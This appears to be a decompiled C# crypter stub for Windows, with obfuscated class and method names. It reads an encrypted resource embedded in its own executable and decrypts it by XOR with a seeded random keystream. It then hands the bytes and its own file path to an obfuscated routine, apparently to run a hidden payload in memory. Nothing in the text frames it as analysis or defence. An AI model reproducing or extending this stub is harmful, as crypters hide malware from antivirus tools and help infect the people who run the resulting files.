using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using Microsoft.VisualBasic.CompilerServices;
using Stub_back;

namespace t;

[StandardModule]
internal sealed class k
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr u, string o, string e);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string l);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr b, IntPtr a);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr i, IntPtr j);

	[SecuritySafeCritical]
	[STAThread]
	public static void t()
	{
		string l = Process.GetCurrentProcess().MainModule!.ModuleName;
		IntPtr moduleHandleA = GetModuleHandleA(ref l);
		IntPtr intPtr = FindResource(moduleHandleA, "69", "GAY");
		IntPtr source = LoadResource(moduleHandleA, intPtr);
		int num = SizeofResource(moduleHandleA, intPtr);
		checked
		{
			byte[] array = new byte[num - 1 + 1];
			Marshal.Copy(source, array, 0, num);
			int seed = BitConverter.ToInt32(array, array.Length - 4);
			Random random = new Random(seed);
			byte[] array2 = new byte[array.Length - 1 + 1];
			random.NextBytes(array2);
			int num2 = array.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				array[i] = unchecked((byte)(array[i] ^ array2[i]));
			}
			jDxmSbcafQKRuIHXbd.pxfJaoLxIfaEywCZfmRedtwzrRfYJjhjhggfhds45nBaaCKXxxX(array, Process.GetCurrentProcess().MainModule!.FileName);
		}
	}
}
